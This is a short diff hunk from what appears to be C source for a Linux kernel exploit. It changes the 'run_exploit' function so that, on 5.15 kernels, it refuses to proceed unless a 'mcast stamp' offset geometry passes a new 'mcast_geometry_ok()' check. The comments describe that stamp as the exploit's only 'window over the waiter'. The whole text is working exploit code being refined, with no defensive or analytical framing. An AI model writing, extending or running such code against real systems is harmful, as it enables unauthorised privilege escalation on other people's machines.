@@ -1207,11 +1207,12 @@ int run_exploit(int argc, char **argv) {
 
   if (!active_offsets && select_offsets() < 0) return 1;
   /* the mcast stamp is 5.15's only window over the waiter: its pselect and
-   * tcp frames both stop short of it, so a profile without the constants has
-   * no transport at all */
+   * tcp frames both stop short of it, so a profile without a usable stamp
+   * geometry has no transport at all. refuse rather than degrade onto the
+   * non-compact pselect arm, matching kernel5_route_selected(). */
   if (strncmp(active_offsets->uname_r, "5.15.", 5) == 0 &&
-      active_offsets->mcast_waiter_off <= 0) {
-    pr_error("5.15 needs the mcast stamp; add mcast_waiter_off, "
+      !mcast_geometry_ok()) {
+    pr_error("5.15 needs a usable mcast stamp; add mcast_waiter_off, "
              "mcast_buffer_size and mcast_lock_offset to %s\n",
              active_offsets->uname_r);
     return 1;
